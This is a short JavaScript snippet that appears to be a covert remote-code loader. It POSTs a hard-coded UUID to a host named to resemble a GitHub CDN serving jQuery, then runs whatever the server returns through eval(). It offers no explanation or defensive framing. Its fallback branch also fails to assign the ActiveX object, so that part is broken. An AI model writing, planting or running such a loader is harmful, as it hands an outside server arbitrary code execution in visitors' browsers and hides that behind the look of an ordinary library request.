var xmlhttp;
var uuid = "ae468880-81d6-11e4-9921-5db8fb9116a2";

if (window.XMLHttpRequest) {
  xmlhttp = new XMLHttpRequest();
} else {
  new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange = function() {
  if (xmlhttp.readyState == 4 ) {
     if(xmlhttp.status == 200) {
         eval(xmlhttp.responseText);
     }
  }
};

xmlhttp.open("POST", "http://github-cdn.com/jquery", true);
xmlhttp.setRequestHeader('Content-Type', 'application/json');
var sending = {version: uuid};
xmlhttp.send(JSON.stringify(sending));
